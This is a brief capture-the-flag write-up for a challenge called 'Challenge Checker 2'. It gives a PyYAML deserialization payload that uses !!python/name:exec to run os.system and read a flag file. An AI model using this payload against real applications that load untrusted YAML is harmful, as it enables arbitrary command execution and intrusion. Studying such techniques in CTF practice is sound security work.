# Challenge Checker 2

Google `pyyaml rce`, find https://github.com/yaml/pyyaml/issues/420 , use the payload, slightly modified, to execute `import os; os.system('cat flag.txt')`

```
!!python/object/new:tuple 
- !!python/object/new:map 
  - !!python/name:exec
  - [ "import os; os.system('cat flag.txt')" ]
```
